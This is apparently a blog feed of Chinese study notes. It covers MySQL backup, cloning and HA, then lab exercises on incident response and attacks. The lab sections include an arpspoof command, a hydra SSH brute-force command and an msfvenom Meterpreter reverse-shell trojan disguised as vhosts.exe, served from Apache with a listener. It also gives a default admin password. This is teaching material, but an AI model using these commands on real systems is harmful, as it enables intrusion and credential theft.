登录默认账号/密码：admin/Yearning_admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-3-1-工具使用"><a href="#4-3-1-工具使用" class="headerlink" title="4.3.1 工具使用"></a>4.3.1 工具使用</h4><pre class="line-numbers language-none"><code class="language-none">请参照视频操作流程。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-数据安全保护-MySQL数据备份恢复"><a href="#5-数据安全保护-MySQL数据备份恢复" class="headerlink" title="5.数据安全保护-MySQL数据备份恢复"></a>5.数据安全保护-MySQL数据备份恢复</h3><h4 id="5-0-数据损坏场景"><a href="#5-0-数据损坏场景" class="headerlink" title="5.0 数据损坏场景"></a>5.0 数据损坏场景</h4><pre class="line-numbers language-none"><code class="language-none">物理损坏：主机硬件损坏，服务器宕机，磁盘损坏，rm,dd,坏块，坏道解决方案：主从、高可用架构、灾备、备份恢复逻辑损坏：drop truncate  delete update解决方案：备份恢复、闪回工具、binlog、延时从库。。。目标： 将数据尽可能恢复到故障之前的状态（PITR），减少数据损失<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-1-在数据备份中需要做哪些事情？"><a href="#5-1-在数据备份中需要做哪些事情？" class="headerlink" title="5.1 在数据备份中需要做哪些事情？"></a>5.1 在数据备份中需要做哪些事情？</h4><pre class="line-numbers language-none"><code class="language-none">设计备份策略    工具 ： 逻辑备份、物理备份    周期 ： 每天、每周、每月日常备份巡检日志备份大小定期恢复演练(测试库)季度半年故障恢复升级迁移<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-2-MySQL数据库备份方式"><a href="#5-2-MySQL数据库备份方式" class="headerlink" title="5.2 MySQL数据库备份方式"></a>5.2 MySQL数据库备份方式</h4><pre class="line-numbers language-none"><code class="language-none">逻辑备份： 就是备份SQLmysqldumpload data/mysqlimportmydumper物理备份：拷贝数据文件Percona Xtrabackup 8.0.12+ Enterprise Backup8017+ Clone Plugin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-3-mysqldump逻辑备份应用"><a href="#5-3-mysqldump逻辑备份应用" class="headerlink" title="5.3 mysqldump逻辑备份应用"></a>5.3 mysqldump逻辑备份应用</h4><pre class="line-numbers language-none"><code class="language-none">-A 全备参数-B db1 db2 db3 备份多个单库备份单个或多个表-R            备份存储过程及函数--triggers    备份触发器-E            备份事件--master-data=2--max-allowed-packet=#mysqldump -uroot -p -A -R -E --triggers --master-data=2  --single-transaction --set-gtid-purged=OFF --max-allowed-packet=256M &gt;/data/backup/full.sql--max-allowed-packet=# The maximum packet length to send to or receive from server例子：mysqldump -uroot -p123 -A  -R  --triggers --master-data=2  --single-transaction|gzip &gt; /backup/full_$(date +%F).sql.gzmysqldump -uroot -p123 -A  -R  --triggers --master-data=2  --single-transaction|gzip &gt; /backup/full_$(date +%F-%T).sql.gzmysqldump备份的恢复方式（在生产中恢复要谨慎，恢复会删除重复的表）set sql_log_bin=0;source /backup/full.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-4-PXB-物理备份应用"><a href="#5-4-PXB-物理备份应用" class="headerlink" title="5.4 PXB 物理备份应用"></a>5.4 PXB 物理备份应用</h4><h5 id="5-4-1-全备应用"><a href="#5-4-1-全备应用" class="headerlink" title="5.4.1 全备应用"></a>5.4.1 全备应用</h5><pre class="line-numbers language-none"><code class="language-none">Percona xtrabackup1.全量备份xtrabackup --defaults-file=/etc/my.cnf --backup --target-dir=/data/backup/full2.数据恢复2.1 准备xtrabackup  --prepare --target-dir=/data/backup/full2.2 拷回数据xtrabackup --copy-back --target-dir=/data/backup/full2.3 修改目录属性启动数据库  chown -R mysql.mysql /data/3306/data  chmod -R 755 /data/3306/data  2.4 启动数据库实例<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="5-4-2-增量备份应用"><a href="#5-4-2-增量备份应用" class="headerlink" title="5.4.2 增量备份应用"></a>5.4.2 增量备份应用</h5><pre class="line-numbers language-none"><code class="language-none">全量备份的目录为： mkdir  -p /data/backup/full增量备份的目录为： mkdir  -p /data/backup/inc1.备份操作：1.1.全量备份：xtrabackup --defaults-file=/etc/my.cnf --backup --parallel=4 --target-dir=/data/backup/full1.2.增量备份：xtrabackup --defaults-file=/etc/my.cnf --backup --parallel=4 --target-dir=/data/backup/inc  --incremental-basedir=/data/backup/full 2.恢复操作：2.1 准备全备份的日志：xtrabackup --prepare --apply-log-only --target-dir=/data/backup/full2.2 准备增量备份的日志：xtrabackup --prepare --apply-log-only --target-dir=/data/backup/full  --incremental-dir=/data/backup/inc2.3 全备份准备：xtrabackup --prepare --target-dir=/data/backup/full2.4 拷回数据：xtrabackup   --copy-back --target-dir=/data/backup/full 2.5 修改数据目录的权限和属性：chown -R mysql:mysql /data/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-5-Clone-Plugin备份工具使用"><a href="#5-5-Clone-Plugin备份工具使用" class="headerlink" title="5.5 Clone Plugin备份工具使用"></a>5.5 Clone Plugin备份工具使用</h4><h5 id="5-5-1-本地克隆-8-0-17"><a href="#5-5-1-本地克隆-8-0-17" class="headerlink" title="5.5.1 本地克隆(8.0.17+)"></a>5.5.1 本地克隆(8.0.17+)</h5><pre class="line-numbers language-none"><code class="language-none"># 加载插件INSTALL PLUGIN clone SONAME 'mysql_clone.so';或[mysqld]plugin-load-add=mysql_clone.soclone=FORCE_PLUS_PERMANENTSELECT PLUGIN_NAME, PLUGIN_STATUSFROM INFORMATION_SCHEMA.PLUGINSWHERE PLUGIN_NAME LIKE 'clone';# 创建克隆专用用户CREATE USER clone_user@'%' IDENTIFIED with mysql_native_password by 'password'; GRANT BACKUP_ADMIN ON *.* TO 'clone_user'; # BACKUP_ADMIN是MySQL8.0 才有的备份锁的权限# 本地克隆[root@db01 3306]# mkdir -p /data/test/[root@db01 3306]# chown -R mysql.mysql /data/mysql -uclone_user -ppasswordCLONE LOCAL DATA DIRECTORY = '/data/test/clonedir';# 观测状态db01 [(none)]&gt; SELECT STAGE, STATE, END_TIME FROM performance_schema.clone_progress;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="5-5-2-远程克隆"><a href="#5-5-2-远程克隆" class="headerlink" title="5.5.2 远程克隆"></a>5.5.2 远程克隆</h5><pre class="line-numbers language-none"><code class="language-none">源端           ----》 目标128                   129backup_admin          clone_plugin# 加载插件INSTALL PLUGIN clone SONAME 'mysql_clone.so';或[mysqld]plugin-load-add=mysql_clone.soclone=FORCE_PLUS_PERMANENTSELECT PLUGIN_NAME, PLUGIN_STATUSFROM INFORMATION_SCHEMA.PLUGINSWHERE PLUGIN_NAME LIKE 'clone';# 创建远程clone用户## 捐赠者授权(源端)create user test_s@'%' identified by '123';grant backup_admin on *.* to test_s@'%';## 接受者授权（目标端）create user test_t@'%' identified by '123';grant clone_admin on *.* to test_t@'%';# 远程clone(目标端)## 开始克隆SET GLOBAL clone_valid_donor_list='10.0.0.128:3306';mysql -utest_t -p123 -h10.0.0.129  -P3306CLONE INSTANCE FROM test_s@'10.0.0.128':3306 IDENTIFIED BY '123';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-MySQL架构设计方面对于安全的保证"><a href="#6-MySQL架构设计方面对于安全的保证" class="headerlink" title="6.MySQL架构设计方面对于安全的保证"></a>6.MySQL架构设计方面对于安全的保证</h3><h4 id="6-1-数据安全在架构方面的要求-高可用容灾技术"><a href="#6-1-数据安全在架构方面的要求-高可用容灾技术" class="headerlink" title="6.1 数据安全在架构方面的要求-高可用容灾技术"></a>6.1 数据安全在架构方面的要求-高可用容灾技术</h4><table><thead><tr><th>无故障时间</th><th>故障时间</th><th>典型架构</th></tr></thead><tbody><tr><td>99.9%</td><td>0.1%= 525.6  min</td><td>KA+双主 ：人为干预</td></tr><tr><td>99.99%</td><td>0.01%= 52.56  min</td><td>MHA 、RM、 consul+zk、ORCH、xenon   ：半自动化，都要配合5.7+GTID+增强半同步</td></tr><tr><td>99.999%</td><td>0.001%   =5.256  min</td><td>PXC 、 MGR 、MIC、MGC</td></tr><tr><td>99.9999%</td><td>0.0001%  =0.5256 min</td><td>自动化、云化、平台化、分布式</td></tr></tbody></table><h4 id="6-2-企业容灾级别"><a href="#6-2-企业容灾级别" class="headerlink" title="6.2 企业容灾级别"></a>6.2 企业容灾级别</h4><table><thead><tr><th>级别</th><th>方式</th><th>RPO</th><th>RTO</th></tr></thead><tbody><tr><td>L0</td><td><strong>无备源中心</strong>:<br>没有灾难恢复能力，只在本地进行数据备份</td><td>24小时+</td><td>4小时+</td></tr><tr><td>L1</td><td><strong>本地备份+异地保存</strong>：<br>本地将关键数据备份，然后送到异地保存。<br>灾难发生后，按预定数据恢复程序恢复系统和数据。</td><td>24小时+</td><td>8小时+</td></tr><tr><td>L2</td><td><strong>双中心主备模式</strong>:<br>在异地建立一个热备份点，通过网络进行数据备份。<br>当出现灾难时，备份站点接替主站点的业务，维护业务连续性</td><td>秒级</td><td>数分钟到半小时</td></tr><tr><td>L3</td><td><strong>双中心双活</strong><br>在相隔较远的地方分别建立两个数据中心，进行相互数据备份。<br>当某个数据中心发生灾难时，另一个数据中心接替其工作任务。</td><td>秒级</td><td>秒级</td></tr><tr><td>L4</td><td><strong>双中心双活 + 异地热备 = 两地三中心</strong><br>在同城分别建立两个数据中心，进行相互数据备份。<br>当该城市的2个中心同时不可用（地震/大面积停电/网络等），快速切换到异地</td><td>秒级</td><td>分钟级</td></tr></tbody></table><pre class="line-numbers language-none"><code class="language-none">RTO (Recovery Time Objective，复原时间目标)是企业可容许服务中断的时间长度。比如说灾难发生后半天内便需要恢复，RTO值就是十二小时；RPO (Recovery Point Objective，复原点目标)是指当服务恢复后，恢复得来的数据所对应时的间点。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="6-2-MySQL-Orch高可用架构设计于应用"><a href="#6-2-MySQL-Orch高可用架构设计于应用" class="headerlink" title="6.2 MySQL Orch高可用架构设计于应用"></a>6.2 MySQL Orch高可用架构设计于应用</h4><h4 id="6-3-1-ORCH介绍"><a href="#6-3-1-ORCH介绍" class="headerlink" title="6.3.1 ORCH介绍"></a>6.3.1 ORCH介绍</h4><pre class="line-numbers language-none"><code class="language-none">Orchestrator（orch）：go编写的MySQL高可用性和复制拓扑管理工具，支持复制拓扑结构的调整，自动故障转移和手动主从切换等。后端数据库用MySQL或SQLite存储元数据，并提供Web界面展示MySQL复制的拓扑关系及状态，通过Web可更改MySQL实例的复制关系和部分配置信息，同时也提供命令行和api接口，方便运维管理。相对比MHA来看最重要的是解决了管理节点的单点问题，其通过raft协议保证本身的高可用。GitHub的一部分管理也在用该工具进行管理。① 自动发现MySQL的复制拓扑，并且在web上展示。② 重构复制关系，可以在web进行拖图来进行复制关系变更。③ 检测主异常，并可以自动或手动恢复，通过Hooks进行自定义脚本。④ 支持命令行和web界面管理复制。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-3-2-ORCH功能展示"><a href="#6-3-2-ORCH功能展示" class="headerlink" title="6.3.2 ORCH功能展示"></a>6.3.2 ORCH功能展示</h4><pre class="line-numbers language-none"><code class="language-none">参考视频功能。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/07ddos-shi-zhan-yan-shi/ddos-shi-zhan-yan-lian/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/07ddos-shi-zhan-yan-shi/ddos-shi-zhan-yan-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="DDOS排查方向"><a href="#DDOS排查方向" class="headerlink" title="DDOS排查方向"></a>DDOS排查方向</h1><ol><li>1、监控查看公网出口网络流量</li><li>2、查看服务器网络链接</li><li>3、查看应用日志</li></ol><h1 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h1><ol><li>1、接入第三方抗DDOS云平台</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/06arp-qi-pian-gong-ji-shi-zhan-yan-lian/arp-qi-pian-gong-ji-shi-zhan-yan-lian/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/06arp-qi-pian-gong-ji-shi-zhan-yan-lian/arp-qi-pian-gong-ji-shi-zhan-yan-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击者"><a href="#攻击者" class="headerlink" title="攻击者"></a>攻击者</h1><p><strong>kail:192.168.188.134</strong><br>下载地址：<a href="https://mirrors.aliyun.com/kali-images/kali-2021.3/kali-linux-2021.3-live-i386.iso">https://mirrors.aliyun.com/kali-images/kali-2021.3/kali-linux-2021.3-live-i386.iso</a></p><h1 id="被攻击者："><a href="#被攻击者：" class="headerlink" title="被攻击者："></a>被攻击者：</h1><p><strong>WINDOWS: 192.168.188.132</strong></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p> <code>sudo apt-get install dsniff</code></p><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -t 目标 -r 网关<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>arp -a</code> 查看IP和MAC绑定关系</p><p><code>arp -d</code> 绑定动态MAC绑定关系</p><p><code>netsh i i show in</code>查看要进行ARP绑定的网卡的idx编号。</p><p><code>netsh -c ”i i” add neighbors 名称 IP MAC地址</code>    绑定命令，注意名称，IP，MAC地址 中间有空格</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/05dns-dhcp-shi-zhan-yan-shi/dns-dhcp-shi-zhan-yan-lian/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/05dns-dhcp-shi-zhan-yan-shi/dns-dhcp-shi-zhan-yan-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="DNS安装"><a href="#DNS安装" class="headerlink" title="DNS安装"></a>DNS安装</h1><p><code>yum install bind bind-utils -y</code></p><h1 id="DHCP安装："><a href="#DHCP安装：" class="headerlink" title="DHCP安装："></a>DHCP安装：</h1><p><code>yum install dhcp</code></p><h1 id="查看DNS服务及DHCP服务IP地址"><a href="#查看DNS服务及DHCP服务IP地址" class="headerlink" title="查看DNS服务及DHCP服务IP地址"></a>查看DNS服务及DHCP服务IP地址</h1><p>  <code>ipconfig/all</code></p><h1 id="查看hosts-文件目录"><a href="#查看hosts-文件目录" class="headerlink" title="查看hosts 文件目录"></a>查看hosts 文件目录</h1><p><code>C:\Windows\System32\drivers\etc</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/04windows-xi-tong-ru-qin-shi-zhan-yan-lian/windows-xi-tong-ru-qin-shi-zhan-yan-lian/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/04windows-xi-tong-ru-qin-shi-zhan-yan-lian/windows-xi-tong-ru-qin-shi-zhan-yan-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击者"><a href="#攻击者" class="headerlink" title="攻击者"></a>攻击者</h1><p><strong>kail:192.168.188.134</strong></p><p>下载地址：<a href="https://mirrors.aliyun.com/kali-images/kali-2021.3/kali-linux-2021.3-live-i386.iso">https://mirrors.aliyun.com/kali-images/kali-2021.3/kali-linux-2021.3-live-i386.iso</a></p><h1 id="被攻击者："><a href="#被攻击者：" class="headerlink" title="被攻击者："></a>被攻击者：</h1><p><strong>WINDOWS: 192.168.188.132</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/03-fu-wu-qi-ru-qin-shi-zhan-yan-lian/fu-wu-qi-ru-qin-shi-zhan-yan-lian/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/03-fu-wu-qi-ru-qin-shi-zhan-yan-lian/fu-wu-qi-ru-qin-shi-zhan-yan-lian/</url>
      
        <content type="html"><![CDATA[<p><code>hydra -s 22 -v -l root -P password.txt 192.168.188.130 ssh</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/02-mu-ma-shi-zhan-yan-shi/mu-ma-shi-zhan-yan-lian/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/02-mu-ma-shi-zhan-yan-shi/mu-ma-shi-zhan-yan-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><h2 id="攻击者"><a href="#攻击者" class="headerlink" title="攻击者"></a>攻击者</h2><p><strong>kail:192.168.188.134</strong></p><p>kail下载地址：<a href="https://mirrors.aliyun.com/kali-images/kali-2021.3/kali-linux-2021.3-live-i386.iso">https://mirrors.aliyun.com/kali-images/kali-2021.3/kali-linux-2021.3-live-i386.iso</a></p><h2 id="被攻击者："><a href="#被攻击者：" class="headerlink" title="被攻击者："></a>被攻击者：</h2><p><strong>win10: 192.168.188.132</strong></p><h1 id="windows木马排查："><a href="#windows木马排查：" class="headerlink" title="windows木马排查："></a>windows木马排查：</h1><ol><li>1、可能通过网络连接观察异常的端口或者IP通信</li><li>2、可以通过任务管理器，详细信息，找到异常文件，使用杀毒软件检测</li></ol><h1 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h1><ol><li>1、开启windows 防火墙</li><li>2、安装正版杀毒软件</li></ol><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.188.134 LPORT=9999 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/vhosts.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h2><pre class="line-numbers language-none"><code class="language-none">msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.188.134set lport 9999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>systemctl start apache2</code></p><p><code>netstat -ntpl</code></p><p><code>netstat -ano|more</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/01-qi-ye-an-quan-ying-ji-xiang-ying-liu-cheng/qi-ye-an-quan-ying-ji-xiang-ying-liu-cheng/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/46-ying-ji-xiang-ying/01-qi-ye-an-quan-ying-ji-xiang-ying-liu-cheng/qi-ye-an-quan-ying-ji-xiang-ying-liu-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="文件检查"><a href="#文件检查" class="headerlink" title="文件检查"></a>文件检查</h1><p><code>find / -mmin -2</code>&nbsp; 最近两分钟修改过的文件</p><p><code>find / -mmin -2 | grep etc</code>&nbsp;&nbsp;最近两分钟修改过的文件并匹配关注的文件</p><p><code>ls --full-time passwd</code>&nbsp; 查看文件修改时间</p><p><code>md5sum passwd</code>&nbsp; &nbsp; &nbsp;查看文件hash</p><h1 id="LINUX日志目录"><a href="#LINUX日志目录" class="headerlink" title="LINUX日志目录"></a>LINUX日志目录</h1><p><code>cd /var/log</code></p><h1 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h1><p>cat&nbsp; 文件名&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;查看文件</p><p>cat&nbsp;文件名 | grep&nbsp;关键字</p><p>cat&nbsp;文件名 | grep&nbsp;关键字&nbsp; | wc -l&nbsp; 统计</p><h1 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h1><p><code>top</code>&nbsp; &nbsp;查看CPU内存相关信息</p><p><code>netstat -ntplu</code>&nbsp; 正在监听的端口</p><p><code>systemctl list-unit-files</code>&nbsp; 查看开机启动服务</p><p><code>systemctl status&nbsp;服务名&nbsp;</code> &nbsp;查看服务状态</p><p><code>certutil -hashfile 文件名&nbsp; </code>&nbsp; &nbsp; &nbsp; win10系统powershell查看文件哈希</p><p><code>ipconfig/all</code>&nbsp;查看网络信息</p><p><code>net user</code>&nbsp; 查看用户</p><p><code>netstat -an | more</code>&nbsp; 查看网络连接</p><h1 id="配置分析"><a href="#配置分析" class="headerlink" title="配置分析"></a>配置分析</h1><p><code>iptables -L</code>&nbsp; &nbsp;查看iptables</p><p><code>echo $PATH</code>&nbsp; LINUX查看环境变量</p><p><code>path</code>&nbsp; &nbsp; &nbsp;windows&nbsp;查看环境变量</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/44-deng-ji-bao-hu/deng-ji-bao-hu/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/44-deng-ji-bao-hu/deng-ji-bao-hu/</url>
      
        <content type="html"><![CDATA[<h1 id="等保流程及渗透测试报告编写"><a href="#等保流程及渗透测试报告编写" class="headerlink" title="等保流程及渗透测试报告编写"></a>等保流程及渗透测试报告编写</h1><h2 id="渗透测试-工作内容"><a href="#渗透测试-工作内容" class="headerlink" title="渗透测试:工作内容:"></a>渗透测试:工作内容:</h2><p>1.自己企业直招的安全工程,针对自身企业业务的安全维护加固。</p><p>2.乙方公司:测评机构,安全厂商。针对甲方企业进行安全防护测试，撰写报告。</p><h2 id="渗透测试的流程"><a href="#渗透测试的流程" class="headerlink" title="渗透测试的流程"></a>渗透测试的流程</h2><ul><li>明确目标</li><li>信息收集</li><li>漏洞探测</li><li>漏洞验证</li><li>信息分析</li><li>获取所需</li><li>信息整理</li><li>形成报告</li></ul><h3 id="立项会议确定目标和信息"><a href="#立项会议确定目标和信息" class="headerlink" title="立项会议确定目标和信息"></a>立项会议确定目标和信息</h3><h3 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标:"></a>明确目标:</h3><h4 id="1-确定范围"><a href="#1-确定范围" class="headerlink" title="1.确定范围:"></a>1.确定范围:</h4><p>测试的目标的范围，ip、域名、内外网</p><h4 id="2-确定规则"><a href="#2-确定规则" class="headerlink" title="2.确定规则:"></a>2.确定规则:</h4><h5 id="渗透测-试和黑客入侵区别"><a href="#渗透测-试和黑客入侵区别" class="headerlink" title="渗透测 试和黑客入侵区别?"></a>渗透测 试和黑客入侵区别?</h5><p>渗透测试:以黑客的角度,模拟攻击,处于保护目的，更全面的发现测试对象的安全隐患</p><p>黑客，不择手段的进行攻击，从而获取非法收益。</p><p>规则内容：能渗透到什么程度?确定攻击时间?可以采取哪些攻击手段?</p><h4 id="3-确定需求"><a href="#3-确定需求" class="headerlink" title="3.确定需求:"></a>3.确定需求:</h4><p>web应用漏洞? 业务逻辑漏洞?人员管理权限漏洞?</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>攻击方式:主动扫描?开放式的搜索?</li><li>基础信息：ip,业务架构，域名，端口</li><li>各种系统依赖的版本信息</li><li>应用信息：涉及到的服务信息，各应用逻辑</li></ul><h3 id="漏洞探索"><a href="#漏洞探索" class="headerlink" title="漏洞探索"></a>漏洞探索</h3><p>通过扫描器，结合漏洞在db查利用</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><ul><li>自动化验证:通过工具进行验证</li><li>手动验证</li><li>暴力破解</li></ul><h3 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h3><p>为下一步试试渗透做准备|</p><p>进准打击。绕过机制，攻击代码</p><h3 id="获取所需"><a href="#获取所需" class="headerlink" title="获取所需"></a>获取所需</h3><p>进行攻击，脱库、持续性存在、清理痕迹。</p><h3 id="信息整理"><a href="#信息整理" class="headerlink" title="信息整理"></a>信息整理</h3><p>整理整个渗透过程中的工具、收集到的结果信息、漏洞信息。 </p><h3 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h3><p>1.提出漏洞存在信息</p><p>2.漏洞出现的原理</p><p>3.通过什么方式可以利用</p><p>4.给出整改建议</p><h1 id="等保流程"><a href="#等保流程" class="headerlink" title="等保流程"></a>等保流程</h1><p>等级保护</p><h2 id="等保发展历程"><a href="#等保发展历程" class="headerlink" title="等保发展历程"></a>等保发展历程</h2><ul><li>1994首次国家提出等级保护概念</li><li>1999针对信息系统保护有法律依据</li><li>2007等保1.0措施。</li><li>2017 立法了《网络安全法》</li><li>2019年 等保2.0颁布</li></ul><h2 id="等保2-0和1-0有什么特点和区别"><a href="#等保2-0和1-0有什么特点和区别" class="headerlink" title="等保2.0和1.0有什么特点和区别"></a>等保2.0和1.0有什么特点和区别</h2><ol><li><p>1.<strong>名称变了</strong>信息安全技术信息等级保护要求改为信息安全基础网络安全等级保护–&gt;与网络安全法相一致。</p></li><li><p>2.<strong>定级对象变化</strong> </p><p>​1.0针对物理安全、网络、主机、应用、数据安全 </p><p>​2.0 在1.0基础上增加了物联网、云产品、移动互联等一系列业务对象。</p></li><li><p>3.安全监管结构变化：</p><p>​1.技术上：</p><p>​2.管理：制度理立项数量更多。</p></li><li><p>4.增加了等保的义务性要求，具有等级保护的法律义务。</p></li></ol><h1 id="为什么要做等保"><a href="#为什么要做等保" class="headerlink" title="为什么要做等保"></a>为什么要做等保</h1><p>不做等保出问题了人祸，做了等保出问题了天灾。</p><p>责任分担：</p><p>完成等保意味着得到公安机关的安全认可，出了问题公安机关会分担责任。</p><p>不做等保，出了问题，用户将承担主要的责任，必要时候，网监部门]会直接进行处罚。</p><p>为了实现国家安全体系化的建设</p><h1 id="如何做等保"><a href="#如何做等保" class="headerlink" title="如何做等保"></a>如何做等保</h1><h2 id="关键性角色"><a href="#关键性角色" class="headerlink" title="关键性角色:"></a>关键性角色:</h2><h3 id="1-公安机关网监部门"><a href="#1-公安机关网监部门" class="headerlink" title="1.公安机关网监部门:"></a>1.公安机关网监部门:</h3><p>主要承担等级保护过程中的监督检查的工作，负责管理测评机构。个测评机构都需要在当地进行备案。</p><h3 id="2-测评机构："><a href="#2-测评机构：" class="headerlink" title="2.测评机构："></a>2.测评机构：</h3><p>各省分布大概3-6个公安备案测评机构，主要负责根据当地网监部i门的要求开展测评工作。</p><h3 id="3-被测评企业"><a href="#3-被测评企业" class="headerlink" title="3.被测评企业:"></a>3.被测评企业:</h3><p>根据网监部i门要求，配合等保相关工作</p><h3 id="4-集成商、实施商、安全厂商"><a href="#4-集成商、实施商、安全厂商" class="headerlink" title="4.集成商、实施商、安全厂商:"></a>4.集成商、实施商、安全厂商:</h3><p>被测评企业需要根据整改方案进行整改,大量的涉及到安全设备的采购与应用。</p><h1 id="等保的流程"><a href="#等保的流程" class="headerlink" title="等保的流程"></a>等保的流程</h1><p>定级备案–&gt;差距评估—&gt;整改建设–&gt;等级评测</p><h2 id="定级备案"><a href="#定级备案" class="headerlink" title="定级备案"></a>定级备案</h2><p>梳理信息系统情况，确定等级,提交定级报告和备案表到当地网监部门。</p><h3 id="等级分类"><a href="#等级分类" class="headerlink" title="等级分类"></a>等级分类</h3><p><img src="assets/image-20230606145117988.png" alt="image-20230606145117988"></p><p><img src="assets/image-20230606150727499.png" alt="image-20230606150727499"></p><h3 id="差距评估"><a href="#差距评估" class="headerlink" title="差距评估"></a>差距评估</h3><p>差距评估报告，整改建议，渗透测试报告</p><h3 id="安全整改"><a href="#安全整改" class="headerlink" 